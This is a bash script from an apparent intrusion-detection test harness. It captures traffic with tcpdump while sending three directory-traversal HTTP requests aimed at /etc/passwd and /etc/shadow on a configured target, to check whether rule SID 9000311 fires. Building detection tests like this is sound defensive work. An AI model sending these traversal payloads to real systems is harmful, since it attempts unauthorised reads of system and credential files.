#!/usr/bin/env bash
# attacks/30_http_traversal.sh
# Directory traversal in URI → SID 9000311
# =============================================================================
source "$(dirname "$0")/../config/eval.conf"
PCAP="${PCAPS_DIR}/${RUN_ID}_30_http_traversal.pcap"

echo "[30_http_traversal] Starting capture"
tcpdump -i "${KALI_IFACE}" tcp port "${HTTP_PORT}" -w "${PCAP}" -q &
CAP_PID=$!
sleep 1

TRAVERSALS=(
    "/../../../../etc/passwd"
    "/files/../../etc/shadow"
    "/.%2e/.%2e/etc/passwd"
)

for path in "${TRAVERSALS[@]}"; do
    echo "[30_http_traversal] GET http://${TARGET_IP}${path}"
    curl -s -o /dev/null \
         --max-time "${HTTP_TIMEOUT}" \
         --http1.1 \
         --path-as-is \
         "http://${TARGET_IP}${path}" \
    || true
    sleep 1
done

sleep "${ALERT_SETTLE_SECS}"
kill "${CAP_PID}" 2>/dev/null; wait "${CAP_PID}" 2>/dev/null || true
echo "[30_http_traversal] Done — PCAP: ${PCAP}"
